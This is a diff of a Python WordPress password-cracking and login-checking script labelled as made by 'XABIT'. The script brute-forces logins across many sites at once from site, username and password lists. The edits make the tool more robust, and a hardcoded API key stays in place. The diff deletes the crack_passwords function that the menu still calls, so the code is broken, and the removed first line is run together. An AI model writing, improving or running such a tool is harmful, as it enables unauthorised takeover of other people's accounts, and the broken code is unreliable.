@@ -1,14 +1,12 @@
-# WORDPRESS PASSWORD CRACKER AND LOGIN CHECKER V1.0 MADE BY XABIT                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          wp-xabit.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    import os
+import os
 import requests
 import time
-import os
 from colorama import Fore, Style
 from pyfiglet import figlet_format
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from queue import Queue
 
 API_KEY = "IEq9GmbMtcapALpiL9jOow9tz3WRRDjbALxaN1JxVIQ"
-API_BASE_URL = "https://wpscan.com/api/v3"
 MAX_THREADS = 60  # Limit threads to 60 requests per second
 
 def print_banner():
@@ -75,7 +73,7 @@ def input_sites_and_credentials_from_file(filename):
     except FileNotFoundError:
         print(Fore.RED + f"File {filename} not found." + Style.RESET_ALL)
     except Exception as e:
-        print(Fore.RED + f"Error reading file: {str(e)}" + Style.RESET_ALL)
+        print(Fore.RED + f"Error reading file {filename}: {str(e)}" + Style.RESET_ALL)
 
     return credentials
 
@@ -84,12 +82,18 @@ def worker(credentials_queue):
         url, username, password = credentials_queue.get()
         brute_force_site(url, username, password)
         credentials_queue.task_done()
-        # Ensure that no more than 60 requests are made per second
         time.sleep(1 / MAX_THREADS)
 
 def brute_force_all_sites():
-    filename = input("Enter the name of the text file containing sites and credentials: ")
+    filename = input("Enter the name of the text file containing sites and credentials: ").strip()
+    if not os.path.isfile(filename):
+        print(Fore.RED + f"File {filename} does not exist or cannot be found." + Style.RESET_ALL)
+        return
+
     credentials = input_sites_and_credentials_from_file(filename)
+    if not credentials:
+        print(Fore.RED + f"No valid credentials found in {filename}." + Style.RESET_ALL)
+        return
 
     credentials_queue = Queue()
     for cred in credentials:
@@ -112,11 +116,16 @@ def main_menu():
     print(Fore.YELLOW + "2. Bruteforce based on file (sites and credentials)" + Fore.RESET)
     print(Fore.YELLOW + "3. Exit" + Fore.RESET)
 
-    option = int(input("Enter your choice (1, 2, or 3): "))
+    try:
+        option = int(input("Enter your choice (1, 2, or 3): "))
+    except ValueError:
+        print(Fore.RED + "Invalid input. Please enter a number." + Style.RESET_ALL)
+        main_menu()
+        return
 
     if option == 1:
-        sites_file = input("Enter the name of the text file containing sites: ")
-        passwords_file = input("Enter the name of the text file containing passwords: ")
+        sites_file = input("Enter the name of the text file containing sites: ").strip()
+        passwords_file = input("Enter the name of the text file containing passwords: ").strip()
         crack_passwords(sites_file, passwords_file)
     elif option == 2:
         brute_force_all_sites()
@@ -129,27 +138,5 @@ def main_menu():
     input("Press Enter to continue...")
     main_menu()
 
-def crack_passwords(sites_file, passwords_file):
-    try:
-        with open(sites_file, 'r') as file:
-            sites = [line.strip() for line in file]
-        with open(passwords_file, 'r') as file:
-            passwords = [line.strip() for line in file]
-
-        for site in sites:
-            users = enumerate_users(site)
-            print(f"Enumerated users for {site}:")
-            for user in users:
-                username = user['username']
-                print(f"- {username}")
-                for password in passwords:
-                    if brute_force_login(site, username, password):
-                        break
-    except FileNotFoundError:
-        print(Fore.RED + "File not found." + Style.RESET_ALL)
-    except Exception as e:
-        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)
-
 if __name__ == "__main__":
     main_menu()
-
